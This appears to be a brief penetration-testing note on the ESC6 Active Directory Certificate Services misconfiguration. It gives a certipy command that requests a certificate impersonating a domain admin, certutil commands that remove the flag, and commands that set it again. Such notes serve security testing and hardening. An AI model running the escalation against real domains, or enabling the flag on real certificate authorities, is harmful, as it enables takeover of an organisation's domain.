# ESC6- Enabled User Specified SAN
If the flag "EDITF_ATTRIBUTESUBJECTALTNAME2" is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.

## Exploit
-------
Exploit ESC6 using ESC1 by providing a custom SAN
```text-plain
$ certipy req -u [USER] -p [PASSWORD] -dc-ip [DC_IP] -target [ADCS_HOST] -ca [ca_name] -template [templateName] -upn [domain admin]
```

## Fix this vulnerability
----------------------

```text-plain
certutil –setreg policy\EditFlags –EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

### Or not : 
---------

```text-plain
certutil –setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

## PS : 
-----

The default **User** template checks all the template requirements stated above.

"Askip" it was patched at the same time as the exploit “Certifried”
